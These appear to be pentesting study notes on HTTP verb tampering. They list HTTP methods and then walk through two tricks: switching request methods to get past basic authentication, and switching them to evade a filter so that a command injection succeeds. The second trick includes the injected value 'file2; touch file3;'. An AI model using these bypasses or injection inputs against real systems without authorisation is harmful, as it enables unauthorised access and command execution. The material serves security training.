To understand `HTTP Verb Tampering`, we must first learn about the different methods accepted by the HTTP protocol. HTTP has [9 different verbs](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods) that can be accepted as HTTP methods by web servers. Other than `GET` and `POST`, the following are some of the commonly used HTTP verbs:

|Verb|Description|
|---|---|
|`HEAD`|Identical to a GET request, but its response only contains the `headers`, without the response body|
|`PUT`|Writes the request payload to the specified location|
|`DELETE`|Deletes the resource at the specified location|
|`OPTIONS`|Shows different options accepted by a web server, like accepted HTTP verbs|
|`PATCH`|Apply partial modifications to the resource at the specified location|

## Bypassing Basic Authentication
We just need to try alternate HTTP methods to see how they are handled by the web server and the web application.

Scenario: Webpage has a delete file function but running it (GET Requests) prompts us for credentials. We can potentially alter the HTTP methods to bypass the authentication prompt.

Exploit
```bash
# Identify Requests server accepts
curl -i -X OPTIONS http://SERVER_IP:PORT/

# Intercept HTTP request with Burp
# Modify Request to POST
Right click > Change request method  # Changes from GET to POST

# Modify Request to HEAD
Change GET to HEAD  # identical to GET but does not return body in response

# Try others as well...
```

## Bypassing Security Filters
Caused by insecure coding errors.

Scenario: Command Injection results in error 'Malicious Request Denied!' If it is a file upload feature, we can easily test HTTP Verbs to bypass

Exploit
```bash
# Initial GET Request
file1;   # Malicious File Detected!

# Intercept HTTP Request
# Modify Request to POST -- Right click > Change Request method > send
file1;   # Upload successful

# Reattempt Command Injection
file2; touch file3;  # if successfule, should have made 2 files at once

# Try others as well...
```